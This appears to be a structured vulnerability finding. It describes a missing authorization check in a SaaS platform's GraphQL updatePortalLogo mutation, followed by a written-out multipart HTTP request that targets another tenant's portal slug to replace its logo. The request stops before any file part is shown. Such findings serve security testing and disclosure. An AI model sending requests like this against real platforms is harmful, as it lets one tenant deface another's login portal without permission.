diagnosis: UpdatePortalLogoMutation accepts a portal_slug identifier and an uploaded graphic file, saving the custom logo onto TenantPortalConfig without ensuring the user is an authorized tenant admin for that slug. An authenticated user can deface the public login portal or corporate dashboard branding of any other tenant on the platform.
exploit_request:
POST /graphql/ HTTP/1.1
Host: portals.saasplatform.com
Authorization: Bearer client_user_jwt
Content-Type: multipart/form-data; boundary=----PortalLogoBoundary

------PortalLogoBoundary
Content-Disposition: form-data; name="operations"

{"query": "mutation ($slug: String!, $logo: Upload!) { updatePortalLogo(portalSlug: $slug, logoImage: $logo) { logoUrl } }", "variables": {"slug": "competitor-corp", "logo": null}}
------PortalLogoBoundary
Content-Disposition: form-data; name="map"

{"0": ["variables.logo"]}
------PortalLogoBoundary
